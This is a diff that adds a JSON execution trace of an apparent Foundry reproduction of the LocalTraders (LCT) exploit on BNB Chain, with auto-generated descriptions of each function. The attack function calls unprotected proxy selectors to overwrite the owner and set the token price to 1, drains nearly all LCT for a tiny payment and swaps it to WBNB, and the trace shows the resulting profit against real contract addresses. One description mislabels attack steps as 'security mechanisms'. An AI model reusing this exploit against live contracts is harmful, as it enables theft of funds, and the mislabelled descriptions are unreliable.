@@ -1,0 +1,296 @@
+[
+    {
+        "id": "267289",
+        "args": "",
+        "original_code": "    function testAccess() public {\n        // 1.Changing owner address in vulnerable contract\n\n        emit log_named_decimal_uint(\n            \"[1] Attacker amount of WBNB before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n        address addrInSlot0Before = getValFromSlot0();\n        emit log_named_address(\"[1] Address value in slot 0 before first call\", addrInSlot0Before);\n\n        // Changing address value in slot 0 (changing owner)\n        address paramForCall1 = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;\n        upgradeableProxy.call(abi.encodeWithSelector(0xb5863c10, paramForCall1));\n\n        address addrInSlot0After = getValFromSlot0();\n        // Confirm address change in slot 0\n        assertEq(addrInSlot0After, paramForCall1);\n        emit log_named_address(\"[1] Address value in slot 0 after first call\", addrInSlot0After);\n\n        // 2.Changing token price in vulnerable contract\n\n        cheats.roll(28_460_898);\n        uint256 uintInSlot3Before = getValFromSlot3();\n        emit log_named_uint(\"[2] Uint value (token price) in slot 3 before second call\", uintInSlot3Before);\n\n        // Changing uint value in slot 3 (token price)\n        uint256 paramForCall2 = 1;\n        upgradeableProxy.call(abi.encodeWithSelector(0x925d400c, paramForCall2));\n\n        uint256 uintInSlot3After = getValFromSlot3();\n        // Confirm price change in slot 3\n        assertEq(uintInSlot3After, paramForCall2);\n        emit log_named_uint(\"[2] Uint value (token price) in slot 3 after second call\", uintInSlot3After);\n\n        // 3.Buying LCT\n\n        cheats.roll(28_460_899);\n        uint256 payableAmount = (LCT.balanceOf(address(LCTExchange)) / 1 ether) - 1;\n\n        LCTExchange.buyTokens{value: payableAmount}();\n\n        emit log_named_decimal_uint(\"[3] Bought LCT tokens\", LCT.balanceOf(address(this)), LCT.decimals());\n\n        // 4.Swap to WBNB\n\n        cheats.roll(28_461_207);\n        LCT.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(LCT);\n        path[1] = address(WBNB);\n",
+        "description": "1. **Core functions**:  \n   The `testAccess` function is designed to simulate an attack on a vulnerable contract. It performs several actions:  \n   - Changes the owner address in the vulnerable contract by modifying a specific storage slot.  \n   - Alters the token price in the vulnerable contract by updating another storage slot.  \n   - Buys a specific token (LCT) using a manipulated price.  \n   - Swaps the purchased LCT tokens for another token (WBNB) using a decentralized exchange router.  \n\n2. **Security mechanism**:  \n   The function uses several security mechanisms:  \n   - `assertEq` is used to confirm that the changes made to storage slots are successful.  \n   - `emit` statements log key values and events for debugging and verification.  \n   - The `cheats.roll` function simulates block number changes, ensuring the attack occurs at specific times.  \n   - The `call` function is used to interact with the vulnerable contract, allowing for low-level manipulation.  \n\n3. **Parameter Function**:  \n   - `paramForCall1`: This is the new owner address to be set in the vulnerable contract.  \n   - `paramForCall2`: This is the new token price to be set in the vulnerable contract.  \n   - `payableAmount`: This is the amount of Ether sent to buy LCT tokens, calculated based on the manipulated token price.  \n   - `path`: This is an array of token addresses used in the swap process, specifying the token swap route (LCT to WBNB).  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it logs key information at each step:  \n   - The balance of WBNB before and after the attack.  \n   - The address in storage slot 0 before and after changing the owner.  \n   - The token price in storage slot 3 before and after manipulation.  \n   - The amount of LCT tokens bought and swapped for WBNB.  \n\nIn summary, the `testAccess` function simulates an attack on a vulnerable contract by manipulating its storage slots, buying tokens at a manipulated price, and swapping them for another token. It uses logging and assertions to verify the success of each step.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "0",
+        "args": "Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000b06a05c7f92578ef927860604edac89fd68dfec9"
+    },
+    {
+        "id": "26073",
+        "args": "0000000000000000000000000567f2323251f0aab15c8dfb1967e4e8a7d42aee",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "18757",
+        "args": "0000000000000000000000000567f2323251f0aab15c8dfb1967e4e8a7d42aee",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000567f2323251f0aab15c8dfb1967e4e8a7d42aee"
+    },
+    {
+        "id": "0",
+        "args": "0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE, 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "28460898 [2.846e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000003",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000002a1766f5d000"
+    },
+    {
+        "id": "1772",
+        "args": "0000000000000000000000000000000000000000000000000000000000000001",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "953",
+        "args": "0000000000000000000000000000000000000000000000000000000000000001",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "0",
+        "args": "Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000003",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "0",
+        "args": "1, 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "28460899 [2.846e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2863",
+        "args": "LCTExchange: [0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06]",
+        "original_code": null,
+        "description": null,
+        "return_value": "32650798746200000000000000 [3.265e25]"
+    },
+    {
+        "id": "46001",
+        "args": "",
+        "original_code": "    function buyTokens() public payable returns (uint, uint) {\n        require(msg.value > 0, \"Send ETH to buy some tokens\");\n\n        // uint256 tokenAmount = msg.value / livePriceRate; // 1 / 0.00004628 = 21607.605877269\n        uint256 tokenAmount2 = msg.value / getLivePriceFromInheritance();\n        uint256 tokenAmount = tokenAmount2 * 1000000000000000000;\n\n        require(\n            token.balanceOf(address(this)) >= tokenAmount,\n            \"Vendor contract has not enough tokens in its balance\"\n        );\n\n        // Transfer token to the msg.sender\n        bool sent = token.transfer(msg.sender, tokenAmount);\n        require(sent, \"Failed to transfer token to user\");\n\n        emit TokensPurchased(\n            msg.sender,\n            address(token),\n            tokenAmount,\n            getLivePriceFromInheritance()\n        );\n\n        return (getLivePriceFromInheritance(), msg.value);\n    }\n\n",
+        "description": "1. **Core functions**:  \nThe `buyTokens` function allows users to purchase tokens by sending Ether (ETH) to the contract. It calculates the number of tokens the user will receive based on the current price rate and ensures the contract has enough tokens to fulfill the purchase. If successful, it transfers the tokens to the user and emits an event to record the transaction.\n\n2. **Security mechanism**:  \n- **`require(msg.value > 0, \"Send ETH to buy some tokens\")`**: Ensures the user sends a positive amount of ETH to avoid invalid transactions.  \n- **`require(token.balanceOf(address(this)) >= tokenAmount, \"Vendor contract has not enough tokens in its balance\")`**: Checks that the contract has enough tokens to complete the purchase, preventing overselling.  \n- **`require(sent, \"Failed to transfer token to user\")`**: Confirms the token transfer was successful, ensuring the user receives their tokens.  \n\n3. **Parameter Function**:  \nThe function does not take any explicit parameters. Instead, it relies on the `msg.value` property, which represents the amount of ETH sent by the user. This value is used to calculate the number of tokens the user will receive.  \n\n4. **Return description**:  \nThe function returns two values:  \n- The first value is the current price rate of tokens, obtained by calling `getLivePriceFromInheritance()`.  \n- The second value is the amount of ETH sent by the user (`msg.value`).  \n\n**In summary**, the `buyTokens` function enables users to purchase tokens using ETH, ensures the transaction is valid and secure, and returns the current token price and the amount of ETH sent.",
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000001f2362d"
+    },
+    {
+        "id": "1514",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "698",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "863",
+        "args": "LCTExchange: [0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06]",
+        "original_code": null,
+        "description": null,
+        "return_value": "32650798746200000000000000 [3.265e25]"
+    },
+    {
+        "id": "28761",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32650797000000000000000000 [3.265e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1514",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "698",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "1514",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "698",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "863",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "32650797000000000000000000 [3.265e25]"
+    },
+    {
+        "id": "432",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "0",
+        "args": "28461207 [2.846e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "25262",
+        "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "863",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "32650797000000000000000000 [3.265e25]"
+    },
+    {
+        "id": "86599",
+        "args": "32650797000000000000000000 [3.265e25], 0, [0x5C65BAdf7F97345B7B92776b22255c973234EfE7, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1684841939 [1.684e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9462",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724, 32650797000000000000000000 [3.265e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "38546702805214331058300818 [3.854e25], 836818761807082992305 [8.368e20], 1684841483 [1.684e9]"
+    },
+    {
+        "id": "863",
+        "args": "0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724",
+        "original_code": null,
+        "description": null,
+        "return_value": "71197499805214331058300818 [7.119e25]"
+    },
+    {
+        "id": "62671",
+        "args": "0, 383240638704329950072 [3.832e20], LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27962",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 383240638704329950072 [3.832e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "863",
+        "args": "0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724",
+        "original_code": null,
+        "description": null,
+        "return_value": "71197499805214331058300818 [7.119e25]"
+    },
+    {
+        "id": "534",
+        "args": "0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724",
+        "original_code": null,
+        "description": null,
+        "return_value": "453578123102753042233 [4.535e20]"
+    },
+    {
+        "id": "534",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "383240638704329950072 [3.832e20]"
+    },
+    {
+        "id": "534",
+        "args": "LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "383240638704329950072 [3.832e20]"
+    },
+    {
+        "id": "444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
